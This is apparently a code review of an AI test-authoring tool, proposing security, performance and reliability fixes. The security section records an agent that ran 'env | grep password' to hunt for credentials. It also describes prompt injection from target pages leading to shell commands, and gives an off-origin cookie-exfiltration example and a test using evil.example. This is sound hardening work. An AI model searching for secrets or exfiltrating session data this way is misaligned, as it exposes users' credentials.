# aitester-bdd: security, performance and reliability proposals (2026-10-23, read-only)

Scope: `/Users/kundeng/Dropbox/Projects/aitester-bdd`, working tree at `main` de7f78d plus the uncommitted spec-04 changes. Builds on `docs/history/review-2026-10-23/03-CODE_QUALITY.md`; findings already fixed there (terminal state, env allowlist, attach-wait in state setup, `_js_bool`, redaction in `_run`) are taken as landed and not repeated. Line numbers are from the current working tree.

**Test run:** `uv run --frozen pytest tests/unit -q -p no:cacheprovider` in the synced scratch venv: **108 passed in 73.5 s**, 0 failed, 0 skipped.

---

## SECURITY

### S1. The in-process author still has an unrestricted shell; give it the same three tools the ACP author gets

**Problem.** Live event (a): a signed-out agent ran `env | grep password` and grepped the run folder. The deepagents path hands the model deepagents' `execute` via `LocalShellBackend(root_dir=None unless source_root, inherit_env=False, env=_agent_env(...))` at `src/aitester_bdd/authoring/agent_loop.py:571-577` and `:740-746`. The env allowlist (`:140-153`) removes variables, but `root_dir` is unset for `aitester author` (cli passes no `source_root`), so the shell reads any file the user can: `~/.ssh`, `.env` in the cwd, the run folder with its bug reports and walk logs. The ACP path (`acp_author.py`) already solved this: one `browser` tool with an allowlisted command set, no shell (`mcp_tools.py:31-35, 39-67`).

**Change.** In `agent_loop.py`, replace `LocalShellBackend` with a LangChain `StructuredTool` named `browser` that calls `mcp_tools.run_browser_command(command, session=session_id())`; pass `backend=None` (or a deepagents `StateBackend`, which is in-memory) so no `execute`/`read_file`/`write_file` tool exists. Update `_AGENT_BROWSER_CHEATSHEET` and `SKILL.md:66-90` ("drive it through bash") to the `browser` tool form that `acp_author._BROWSER_HELP` already uses. `playwright_tools.py` is unaffected (typed tools, no shell).

**Proof.** Unit: build the agent (`create_deep_agent`) with a fake model and assert the tool names are exactly `{browser, write_robot_suite, report_bug}` (plus `write_todos` when planning is on). Live: re-run one Archestra story; the progress line must never print `execute`.

**Cost.** Loses `ls`/`cat` of the project source for grounding against code, which `source_root` was for; nobody used it in the live runs. Loses `&&` chaining unless S1 ships with P1 below. **Owner decision:** if a shell is wanted for some stories, it needs a sandbox runtime (OrbStack machine vs Docker container, bind-mounting only the run folder read-only); that is a separate design, not a flag on `LocalShellBackend`.

### S2. Credentials by name: a reference grammar for `state_setup` values and a sign-in fixture that runs before the agent starts

**Problem.** `And I configure state setup action=password css=… value=…` puts the literal password in the `.robot` file (`AITester.py:1730-1736`, `walk.py:1782`). For authoring, the only signed-in path is `AITESTER_AUTHOR_SESSION` (`authoring/tools.py:60-75`): the operator must sign in by hand in a named agent-browser session. In event (a) the agent was signed out because that step was skipped, and it went looking for the password itself.

**Change.** (1) `walk.py:_run_state_setup`: accept `value=env:NAME` (and `value=secret:NAME` for a future store); resolve centrally in one function `resolve_secret_ref(str) -> Secret`, where `Secret` is a `str` subclass whose `__repr__`/`__str__` are `***`; unknown schemes raise. Backends receive the `Secret` and call `.reveal()` only when building argv. (2) `cli.author`: a `--signin <file.robot>` option that runs that suite's `state_setup` block in aitester's own agent-browser session via `_run_state_setup`, then starts the agent with that session (today's `AITESTER_AUTHOR_SESSION` logic, `tools.py:69-71`). The password is read from the environment by Python; the agent never sees a name it could `env | grep`, because S1 removed the shell.

**Proof.** Unit: `resolve_secret_ref("env:X")` with `X` set returns a value whose `repr` is `***`; `state_setup` with `value=env:MISSING` raises `StateSetupError` naming the variable, not the value. Live: author against Archestra with `--signin`; transcript grep for the password returns nothing.

**Cost.** One more flag; one more grammar. **Owner decision:** the reference grammar (`env:`/`secret:` prefixes vs `${VAR}` vs a `secrets.yaml`), and whether T3a (OS keychain) is in scope now.

### S3. A suite can run arbitrary shell at replay time

**Problem.** `walk.py:593-595` runs a suite's `shell` action with `_sp.run(cmd, shell=True, …)`. The suite is written by an LLM steered by page content (`write_robot_suite`, `tools.py:179-189`), so a prompt injection on the target site becomes a shell command on the runner on the next `aitester run`. `suite_problems` only checks Robot syntax.

**Change.** Default-deny: `_eval_action` raises unless `WalkContext.allow_shell` is true (`AITESTER_ALLOW_SHELL=1`, `context.py`). Separately, `suite_problems` reports any `shell` action so the author tool refuses it unless the story asks for shell checks (`examples/shell_assertions`).

**Proof.** Unit: `test_walker_with_fake_browser` scenario with a `shell` action and default context fails with `shell actions are disabled`; with `allow_shell=True` it runs.

**Cost.** `examples/shell_assertions/api_health.robot` needs the flag. Small.

### S4. The MCP `browser` tool lets the agent navigate off-origin and run page JS; pin `open` to the target origin

**Problem.** `BROWSER_COMMANDS` (`mcp_tools.py:31-35`) includes `open` and `eval`. An agent (or an injected page) can `open https://attacker/?q=<cookie>` or `eval fetch(...)` and exfiltrate the signed-in session's page data. The ACP policy only checks tool *names* (`acp_author.py:64-71`).

**Change.** `run_browser_command` takes `base_url`; for `open`, parse the URL and refuse a different scheme+host. For `eval`, keep it (snapshots depend on it) but log the expression at INFO so a transcript review can find it. `AcpAuthor` passes `--base-url` to the MCP server (`acp_author.py:182-188`).

**Proof.** Unit beside `test_browser_tool_refuses_outside_the_allowlist`: `open https://evil.example/` with `base_url=https://app.example` returns an ERROR string without spawning.

**Cost.** SSO redirects to another host break; allow an `AITESTER_ALLOWED_ORIGINS` list for that.

### S5. Secret values still travel on argv

**Problem.** `agent_browser_backend.py:283-285` passes the typed value as a CLI argument; the previous review's 7c noted this and the fix redacted error text only (`:106-117`). `ps` on a shared runner shows it for the subprocess's lifetime.

**Change.** Check whether the installed agent-browser accepts the value on stdin or from an env var (`agent-browser fill --help`); if yes, use it for `secret=True`. If not, type via `eval` with the value passed through `AGENT_BROWSER_*`-prefixed env (already allowlisted at `agent_loop.py:143`) and read with `process.env` on the CLI side only if the CLI exposes it. This needs a check against the binary; not verified in this review.

**Proof.** Live: `ps -ef | grep agent-browser` during a `type secret` step shows no value.

**Cost.** Depends on the CLI; may need an upstream change to agent-browser (Kun's own fork, `@bayeslearner/agent-browser` per `agent_browser_backend.py:97`).

---

## PERFORMANCE

### P1. Batch browser commands in one tool call (ACP path) and keep `&&` semantics in the in-process path

**Problem.** Event (c): 60–600 s per story, one model round trip per browser read. `mcp_tools.browser` runs exactly one command (`:39-67`). The deepagents path got chaining only because the shell allowed `&&` (`agent_loop.py:179`), which S1 removes.

**Change.** `browser(commands: list[str])` (keep `command: str` as a one-element alias): run sequentially in the session, stop at the first non-zero exit, return a JSON list of `{command, exit, output}`. Both authors use the same function, so one change serves both. Update `_BROWSER_HELP` with a worked example (`open … ; wait '[data-testid=app]' ; snapshot -c -i`).

**Proof.** Unit: three commands with a stubbed `subprocess.run` produce three outputs and one tool call; a failing second command stops the third. Live: step count on the progress line for the same story, before vs after.

**Cost.** Larger single tool outputs; cap at `_MAX_OUTPUT` per command as now.

### P2. Stop spawning a subprocess per poll in the runtime backend

**Problem.** `AgentBrowserBackend.wait_for_elements_state` (`agent_browser_backend.py:218-230`) loops `get_count` every 100 ms; each `get_count` is a process spawn (`:476-486`), so a 30 s observation timeout is roughly 100–200 spawns. `resolve_fallback_selector` spawns once per candidate (`:521-539`); `_dismiss_interrupts` and `_check_guards` spawn once per selector per rule (`walk.py:664-668, 733-736`).

**Change.** Use the CLI's own `wait '<css>'` (listed in the cheatsheet, `agent_loop.py:170`) with the timeout for the attached case, and one `eval` returning `[document.querySelectorAll(a).length, …]` for a list of selectors (fallback candidates, interrupt selectors, guard selectors). Add `get_counts(selectors: list[str]) -> list[int]` to the backend surface and let the two other backends implement it trivially.

**Proof.** Unit: `test_backend_conformance` gains `get_counts`; a fake `subprocess.run` counter shows one spawn for a five-candidate fallback. Live: wall-clock of `examples/login_flow` on agent-browser before/after.

**Cost.** `eval`-based counts see CSS only; the `text=` dialect in `click_text` (`:249`) still goes through the CLI. Behaviour change in the detached case needs the CLI's `wait --hidden` or the current loop.

### P3. The 30 s content-getter stall is worked around in three prompts; fix it in the tool

**Problem.** `_EXPLORE_SYSTEM_PROMPT:62-67` and `_AUTHOR_PROBING_BLOCK:236-244` teach the model to pre-check `get count` because `get text` blocks 30 s on zero matches. Every time the model forgets, 30 s is lost; the prompt is a cost on every call.

**Change.** In `run_browser_command`, for `get text|html|attr|value|box`, run `get count` (or the P2 `eval`) first and return `ERROR: 0 elements match <sel>` at once. Delete the two prompt blocks.

**Proof.** Unit: stubbed `subprocess.run` returning `0` for count never sees the `get text` call. Live: no step on the progress line exceeds ~5 s for a selector miss.

**Cost.** One extra spawn per content read when the element exists (removed again by P2's `eval`).

### P4. Resume instead of restart on the second attempt

**Problem.** `author_with_agent` (`agent_loop.py:487-515`) re-runs `_author_once` from an empty thread after a crash or recursion limit, so the second attempt repeats every page read already paid for. `InMemorySaver` is created inside `_author_once` (`:585`), so the checkpoint is discarded.

**Change.** Create the checkpointer in `author_with_agent`, keep `thread_id` fixed, and on retry send only the retry hint as the next user message; raise `recursion_limit` for the resumed run.

**Proof.** Unit with a fake model that raises on call 3 then succeeds: total model calls across both attempts equals the single-run count plus one.

**Cost.** A retry after a *bad* trajectory inherits it; keep `max_attempts=2`.

### P5. Trim the system prompt

**Problem.** `load_skill()` sends all of `SKILL.md` (1,092 lines) as the system prompt on every model call for both authors (`agent_loop.py:349`, `acp_author.py:76`). Most of it is runtime-grammar reference (expansion, artifacts, extractors) the author rarely needs.

**Change.** Split `SKILL.md` into the authoring core (phases, selector rules, the keyword table) and a reference part loaded by the `aitester` MCP server as an MCP *resource* (or a `grammar(topic)` tool) the agent fetches on demand.

**Proof.** Token count of the first request before/after (the openai client logs it at DEBUG); no change to `tests/unit/test_agent_runtime.py::test_prompts_carry_the_navigation_rule`.

**Cost.** Two documents to keep aligned; `docs/` already duplicates the grammar.

---

## RELIABILITY

### R1. Refuse Playwright-only selectors at `write_robot_suite` time, and verify each pinned selector live

**Problem.** Event (b): 3 of 9 suites failed on replay because of `:has-text(...)` and `a|b` fallbacks. `suite_problems` (`tools.py:117-135`) checks Robot syntax only. The agent-browser runtime understands plain CSS plus the ` | ` fallback with spaces (`agent_browser_backend.py:528`), `>>` scoping and `nth=` internally (`walk.py:1228, 1475`). `SKILL.md:72-73` says "CSS is the lingua franca" and nothing more.

**Change.** Extend `suite_problems(content, *, engine, probe=None)`: walk the model for keywords with a `${css}` argument (`AITester.py:783-913`), and (1) reject `:has-text(`, `:text(`, `text=`, `:visible`, `:nth-match`, and `|` without surrounding spaces when `engine` is `agent-browser` or `nodriver`; (2) when `probe` (a `get_counts` callable from P2) is given, run every pinned selector in the author's session and reject those with 0 matches, naming each. Both authors already call `suite_problems`, so the ACP server gets the check too. This enforces the spec-04 invariant "every selector was observed on the live page" instead of asking for it in prose.

**Proof.** Unit: a suite with `Then selector "button:has-text('Save')" exists` returns a problem naming the line; with `probe=lambda sels: [0]*len(sels)` every selector is reported. Live: re-author the three failed Archestra stories; `aitester run` passes or fails on behaviour, not selector parse errors.

**Cost.** Longer `write_robot_suite` (one probe batch); the ` | ` fallback rule needs a one-line note in SKILL.md.

### R2. `skip_when` doubles as the state-setup success marker

**Problem.** Event (d): the sign-in fixture needed waits and read-back. The attach-wait before each step landed (`walk.py:1806-1809`), but after the last `click` nothing waits for the signed-in state unless the author adds `action=wait css=…`; `_run_state_setup` ends with `wait_for_load_state("networkidle")`, a no-op on agent-browser (`agent_browser_backend.py:210-212`). The first scenario then runs against a half-hydrated page.

**Change.** After the actions, if `skip_when` is set, `wait_for_elements_state(skip_when, "attached", 30 s)` and raise `StateSetupError("signed-in marker … did not appear")` if it does not. Document `skip_when` as "the marker that proves setup is done, also used to skip it".

**Proof.** Unit in `test_walker_with_fake_browser`: fake browser where `skip_when` never matches raises `StateSetupError`; where it matches after two polls, the first scenario runs.

**Cost.** Suites without `skip_when` keep today's behaviour; SKILL.md should make `skip_when` required when `state_setup` is used.

### R3. Make the global run timeout opt-in and report it as a budget, not a failure of the rule it landed on

**Problem.** Event (e): `DEFAULT_RUN_TIMEOUT_S = 300` (`walk.py:58`, `context.py:27, 37`) is checked between rules (`walk.py:1004-1009`), so a long but healthy run fails every remaining rule with `run_timeout`. The per-rule timeout (`timeout_ms`) already bounds a hung step.

**Change.** Default `run_timeout_s = 0` (no cap); `AITESTER_RUN_TIMEOUT` and a suite-level `And I set run timeout ${s} s` set it. When the deadline hits, mark the remaining rules `skipped` with reason `run budget exhausted`, not `failed`, and put the budget in the verdict summary. `aitester run` prints the budget when set.

**Proof.** Unit: fake browser with two rules and `run_timeout_s=0` runs both; with a 0.1 s deadline and a slow first rule, the second rule's result is skipped-with-reason.

**Cost.** A runaway run with no per-rule timeouts has no cap; `DEFAULT_OBSERVATION_TIMEOUT_MS` (30 s per check) still bounds each step.

### R4. Cleanup actions that run even when the run aborts

**Problem.** Event (f): invitations and projects left behind. There is no cleanup concept; `Then I finalize verification` writes artifacts (`walk.py:1963-1973`), and an exception before it leaves nothing to run.

**Change.** `And I configure cleanup action=… css=…` with the `state_setup` grammar plus `action=api method=DELETE path=…` (reusing the `httpx` client at `walk.py:479-489`), stored on `Verification.cleanup`; `walk_verification` runs it in a `finally` and records each step's outcome in the walk log. SKILL.md rule: test data names carry the run id (`aitester-<run-id>-…`) so leftovers are identifiable.

**Proof.** Unit: a scenario that raises mid-rule still executes the cleanup actions (fake browser records them). Live: run an Archestra invite story with `Ctrl-C`; the invite is gone.

**Cost.** UI cleanup through a half-broken app can itself fail; the API form is more robust but needs a token. **Owner decision:** UI-only cleanup, API cleanup, or both.

### R5. Steer exact counts to bounds at authoring time

**Problem.** Event (g): `count … equals N` (`SKILL.md:348`) broke on unrelated UI changes.

**Change.** In the R1 linter: `count_eq` with N ≥ 2 returns `WARN: exact count N on <sel>; prefer "is at least"` unless the story names the number. SKILL.md: `equals` is for 0 and 1.

**Proof.** Unit: suite with `equals 7` returns the warning; `equals 1` does not.

**Cost.** None beyond the lint.

### R6. An invalid selector must not read as "0 elements"

**Problem.** `get_count` returns 0 on any CLI error (`agent_browser_backend.py:476-480`). With R1 absent, a Playwright-only selector that the runtime rejects reads as 0, so `hidden` passes ("absent counts as hidden", `walk.py:143-146`), `selector does not exist` passes, and `wait_for_elements_state` polls the error for 30 s. This is the silent twin of (b): a suite can pass for the wrong reason.

**Change.** `get_count` re-raises when the CLI's stderr matches a selector-syntax error (`Unexpected token`, `is not a valid selector`, `Unknown engine`); `wait_for_elements_state` stops at once on that error. Same in `nodriver_backend.py:516-527`.

**Proof.** Unit in `test_fail_closed.py`: fake `_run` raising `RuntimeError("… is not a valid selector")` makes `hidden` and `selector_missing` fail with "invalid selector", not pass.

**Cost.** Needs the real error strings from the installed CLI; verify once.

---

## What blocks a release tag today

| Check | State | Blocks? |
|---|---|---|
| Unit tests | 108 passed, 73.5 s | no |
| `ruff check src/` (CI runs it) | **3 × I001** unsorted imports: `authoring/acp_author.py:27`, `:165`, `authoring/tools.py:21` (`ruff --fix` clears them) | **yes, CI fails** |
| `uv lock --check` | consistent (145 packages); `uv.lock` is modified but matches `pyproject.toml` | no |
| Working tree | 16 modified, 4 untracked (`acp_author.py`, `mcp_tools.py`, `specs/04-…`, `docs/history/`), nothing committed since de7f78d | yes, commit first |
| Version fields | `pyproject.toml:3` and `src/aitester_bdd/__init__.py:11` both `0.4.2`, which is already tagged; dependency bounds changed (`deepagents>=0.7.31,<0.8`, `langchain>=1.3`) and a new extra `acp` was added, so a bump is due; `0.5.0` fits | yes |
| CHANGELOG | last entry `[0.4.2] - 2026-07-07`; no Unreleased section for spec 04 (ACP author, env allowlist, fail-closed checks, LLM budget) | yes |
| Spec 04 | `status: DRAFT` while its code is in the tree; `spec-driven-dev` wants ACTIVE with task dispositions before the tag | yes (process) |
| CI definition | `.github/workflows` runs `uv sync --dev` (not `--frozen`) and `pytest tests/` on 3.11–3.13; `tests/integration` and `tests/golden` are empty | no, note only |
| Repo root | holds run outputs (`walk_log.jsonl` 686 KB, `failures.jsonl`, `log.html`, `output.xml`, `report.html`, `site/`); `git status` does not list them, so they are ignored or tracked; confirm `uv build` excludes them before publishing | check |
| Packaging | `acp` extra pins `agent-client-protocol>=0.12.1,<0.13` and `mcp>=2.3,<3`; `mcp_tools.py` imports `mcp.server.mcpserver.MCPServer`, which exists only in the new mcp 2.x API, so the floor is right | no |

Coverage limits of this review: `playwright`/`stealth` extras not installed, so `browser.py` behaviour is read, not run; the agent-browser CLI's flags for S5 and the error strings for R6 were not checked against the binary.
